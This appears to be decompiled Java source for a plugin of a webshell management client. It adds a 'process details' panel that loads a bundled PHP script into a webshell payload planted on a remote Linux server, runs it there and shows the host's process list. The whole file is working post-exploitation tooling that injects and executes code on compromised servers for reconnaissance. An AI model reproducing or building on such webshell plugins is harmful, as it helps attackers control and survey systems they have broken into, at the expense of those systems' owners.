package shells.plugins.php;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.DataView;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import java.util.Vector;
import java.util.concurrent.CopyOnWriteArrayList;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(
   payloadName = "PhpDynamicPayload",
   Name = "PPs",
   DisplayName = "进程详情"
)
public class PPs implements Plugin {
   private static final String CLASS_NAME = "Ps";
   private static final Vector COLUMNS_VECTOR = new Vector(new CopyOnWriteArrayList(new String[]{"UID", "PID", "PPID", "STIME", "TTY", "TIME", "CMD"}));
   private final JPanel panel = new JPanel(new BorderLayout());
   private final DataView dataView;
   private final JButton scanButton = new JButton("ps");
   private boolean loadState;
   private final JSplitPane portScanSplitPane;
   private ShellEntity shellEntity;
   private Payload payload;
   private Encoding encoding;

   public PPs() {
      this.dataView = new DataView((Vector)null, COLUMNS_VECTOR, -1, -1);
      this.portScanSplitPane = new JSplitPane();
      this.portScanSplitPane.setOrientation(0);
      this.portScanSplitPane.setDividerSize(0);
      JPanel topPanel = new JPanel();
      topPanel.add(this.scanButton);
      this.portScanSplitPane.setTopComponent(topPanel);
      this.portScanSplitPane.setBottomComponent(new JScrollPane(this.dataView));
      this.panel.add(this.portScanSplitPane);
   }

   private void load() {
      if (!this.loadState) {
         try {
            InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.php", "Ps"));
            byte[] data = functions.readInputStream(inputStream);
            inputStream.close();
            if (this.loadState = this.payload.include("Ps", data)) {
               this.loadState = true;
               Log.log("Load success");
            } else {
               Log.log("Load fail");
            }
         } catch (Exception var3) {
            Log.error((Throwable)var3);
         }
      }

   }

   private void scanButtonClick(ActionEvent actionEvent) {
      if (!this.payload.isWindows()) {
         this.load();
         byte[] result = this.payload.evalFunc("Ps", "run", new ReqParameter());
         String resultString = this.encoding.Decoding(result);
         this.formatResult(resultString);
      } else {
         GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "仅支持Linux", "警告", 2);
      }

   }

   private void formatResult(String resultString) {
      String[] lines = resultString.split("\n");
      String[] infos = null;
      Vector rowsVector = new Vector();
      Vector columnVector = null;
      Log.log(resultString);
      String[] var6 = lines;
      int var7 = lines.length;

      for(int var8 = 0; var8 < var7; ++var8) {
         String line = var6[var8];

         try {
            infos = line.trim().split("\t");
            Vector oneRowVector = new Vector();
            String[] var11 = infos;
            int var12 = infos.length;

            for(int var13 = 0; var13 < var12; ++var13) {
               String info = var11[var13];
               oneRowVector.add(info.trim());
            }

            if (columnVector == null) {
               columnVector = oneRowVector;
            } else {
               int index = oneRowVector.size() - 1;
               String v = (String)oneRowVector.get(index);
               oneRowVector.set(index, new String(functions.base64Decode(v)));
               rowsVector.add(oneRowVector);
            }
         } catch (Exception var15) {
            Log.error(line);
         }
      }

      this.dataView.getModel().setColumnIdentifiers(columnVector);
      this.dataView.AddRows(rowsVector);
   }

   public void init(ShellEntity shellEntity) {
      this.shellEntity = shellEntity;
      this.payload = this.shellEntity.getPayloadModule();
      this.encoding = Encoding.getEncoding(this.shellEntity);
      automaticBindClick.bindJButtonClick(this, this);
   }

   public JPanel getView() {
      return !this.payload.isWindows() ? this.panel : null;
   }
}
